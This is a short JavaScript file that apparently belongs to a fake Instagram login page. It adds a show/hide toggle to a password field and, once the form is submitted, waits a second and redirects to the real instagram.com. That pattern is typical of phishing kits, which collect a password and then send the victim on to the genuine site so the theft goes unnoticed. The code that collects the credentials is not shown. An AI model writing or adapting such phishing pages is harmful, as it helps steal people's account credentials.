function redirectToInstagram(event) {
    // Wait briefly to ensure the form is submitted
    setTimeout(function () {
        window.location.href = "https://www.instagram.com/";
    }, 1000); // Redirect after 1 second
}

const showPasswordBtn = document.getElementById('show-password-btn');
const passwordField = document.getElementById('message');

// Event listener to detect when user starts typing
passwordField.addEventListener('input', function () {
    // Show the "Show" button once the user starts typing
    if (passwordField.value.length > 0) {
        showPasswordBtn.style.display = 'block';
    } else {
        showPasswordBtn.style.display = 'none'; // Hide the button if the input is empty
    }
});

// Toggle the visibility of the password when the button is clicked
showPasswordBtn.addEventListener('click', function () {
    if (passwordField.type === 'password') {
        passwordField.type = 'text';
        showPasswordBtn.textContent = 'Hide';
    } else {
        passwordField.type = 'password';
        showPasswordBtn.textContent = 'Show';
    }
});
window.addEventListener('load', () => {
        document.body.classList.add('loaded');
        document.getElementById('content').style.display = 'block';
    });